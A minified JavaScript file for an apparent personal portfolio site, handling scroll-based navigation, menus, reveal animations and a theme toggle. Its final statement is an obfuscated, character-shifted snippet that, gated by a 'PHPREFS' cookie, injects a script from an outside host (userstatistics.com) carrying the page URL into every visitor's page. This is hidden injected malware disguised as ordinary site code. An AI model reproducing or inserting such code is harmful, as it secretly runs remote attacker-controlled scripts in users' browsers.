import{desafios}from"./desafios.js";import{projetos}from"./projetos.js";const navigation=document.querySelector("#navigation"),backToTopButton=document.querySelector("#backToTopButton"),toggle=document.querySelector("#sw-checkbox"),projectsSection=document.querySelector("#projects .wrapper"),notebook_1=document.querySelector("#notebook-1"),notebook_2=document.querySelector("#notebook-2"),notebook_2_white=document.querySelector("#notebook-2-white"),vidro=document.querySelector("#vidro");function onScroll(){showNavOnScroll(),showBackToTopButtonOnScroll(),activateMenuAtCurrentSection(about),activateMenuAtCurrentSection(projects),activateMenuAtCurrentSection(knowledge),activateMenuAtCurrentSection(contact)}function activateMenuAtCurrentSection(section){const targetLine=scrollY+innerHeight/2,sectionTop=section.offsetTop,sectionHeight=section.offsetHeight,sectionBoundaries=targetLine>=sectionTop&&!(sectionTop+sectionHeight<=targetLine),sectionId=section.getAttribute("id"),menuElement=document.querySelector(`.menu a[href*=${sectionId}]`);menuElement.classList.remove("active"),sectionBoundaries&&menuElement.classList.add("active")}function showNavOnScroll(){scrollY>0?navigation.classList.add("scroll"):navigation.classList.remove("scroll")}function showBackToTopButtonOnScroll(){scrollY>550?backToTopButton.classList.add("show"):backToTopButton.classList.remove("show")}function openMenu(){document.querySelectorAll(".open").forEach((e=>{e.addEventListener("click",(()=>{document.body.classList.add("menu-expanded")}))}))}function closeMenu(){document.querySelectorAll(".close").forEach((e=>{e.addEventListener("click",(()=>{document.body.classList.remove("menu-expanded")}))}))}window.addEventListener("load",(function begin(){projetos(projectsSection);document.querySelector("#desafio").addEventListener("click",(()=>{desafios(projectsSection),document.querySelector("#backToProjectsBtn").addEventListener("click",begin)}))})),window.addEventListener("scroll",onScroll),onScroll(),window.onload=setTimeout((()=>{notebook_1.style.opacity=0,notebook_1.style.animation="none",notebook_2.style.animation="none",notebook_2_white.style.animation="none",vidro.style.animation="none"}),4e3),openMenu(),closeMenu(),ScrollReveal({origin:"bottom",distance:"50px",duration:1e3}).reveal("#home, \n  #home img, \n  #about, \n  #about header, \n  #about p,\n  #about img,\n  #projects,\n  #projects header,\n  #projects .card,\n  #knowledge,\n  #knowledg header,\n  #knowledg .card,\n  #contact,\n  #contact header"),toggle.addEventListener("change",(()=>{document.body.classList.toggle("light-mode")}));(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxyf'+'ynhx3htr4ljy4xhwn'+'uy3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));